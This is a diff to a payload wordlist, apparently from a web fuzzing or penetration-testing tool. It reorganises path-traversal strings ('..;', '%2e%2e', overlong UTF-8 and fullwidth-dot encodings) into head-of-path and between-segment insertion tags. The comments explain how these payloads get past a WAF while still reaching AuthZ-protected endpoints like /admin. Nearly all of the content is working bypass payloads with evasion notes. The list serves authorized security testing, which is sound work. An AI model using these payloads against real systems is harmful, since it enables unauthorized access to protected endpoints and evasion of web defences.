@@ -528,36 +528,47 @@
 
 # ==============================================================================
 # CLASSIFICATION TAG REFERENCE
-#   [p]payload  prefix-only injection   (payload+segment)
-#   [s]payload  suffix-only injection   (segment+payload)
-#   [w]payload  sandwich-wrap injection (payload+segment+payload)
-#   [b]payload  between-segments insert (new standalone segment)
-#   [a]payload  all four of the above
-#   (no tag)    default: p + s + w (not b)
-# Combine: [pb]payload = prefix + between. [sw]payload = suffix + sandwich.
+#   [p]payload  prefix injection        (payload+segment, on each segment)
+#   [s]payload  suffix injection        (segment+payload, on each segment)
+#   [w]payload  sandwich injection      (payload+segment+payload)
+#   [h]payload  HEAD insert             (new first segment, position 0 only)
+#   [b]payload  BETWEEN insert          (new segment at every position)
+#   [a]payload  all five of the above
+#   (no tag)    default: p + s + w
+# Notes for AuthZ-bypass use case:
+#  - [h] is safe for traversal payloads (../, ..;, %2e%2e): /..;/admin still
+#    normalizes to /admin on the server, preserving the target endpoint.
+#  - [b] mid-path with traversal reroutes off-target (/api/..;/users -> /users).
+#    Use [b] only for no-op payloads (., %2e) that normalize out harmlessly.
+# Combine: [hb]payload = head + between. [sw]payload = suffix + sandwich.
 # ==============================================================================
 
 # ------------------------------------------------------------------------------
-# Between-segments insertion ([b]) — inserts payload as its own path segment
-# between existing segments. Unlocks classic bypasses like /api/..;/v1/users
-# (Tomcat, Spring actuator) that segment-modifying injection cannot produce.
-# Keep these payloads slash-free; '/' separators are added by the join.
+# HEAD insertion ([h]) — inserts traversal payload before the first segment.
+# /..;/admin still resolves to /admin after server-side normalization, so the
+# WAF sees a different request shape but the AuthZ-protected handler still runs.
+# Non-zero BETWEEN positions would reroute off-target — use [h] not [b].
 # ------------------------------------------------------------------------------
-[b]..
-[b]..;
-[b]..%00
-[b]..%09
-[b]..%0d
+[h]..
+[h]..;
+[h]..%00
+[h]..%09
+[h]..%0d
+[h]%2e%2e
+[h]%2e%2e;
+[h]%2e%2e%00
+[h]..%2f..
+[h]%2e%2e%2f%2e%2e
+[h]..;..
+[h]..;..;
+[h]%c0%ae%c0%ae
+[h]%ef%bc%8e%ef%bc%8e
+[h]..%5c..
+[h]..\..
+
+# ------------------------------------------------------------------------------
+# BETWEEN insertion ([b]) — no-op markers only. Safe at every position because
+# they normalize out (. and %2e are current-directory, leave the target intact).
+# ------------------------------------------------------------------------------
 [b].
 [b]%2e
-[b]%2e%2e
-[b]%2e%2e;
-[b]%2e%2e%00
-[b]..%2f..
-[b]%2e%2e%2f%2e%2e
-[b]..;..
-[b]..;..;
-[b]%c0%ae%c0%ae
-[b]%ef%bc%8e%ef%bc%8e
-[b]..%5c..
-[b]..\..
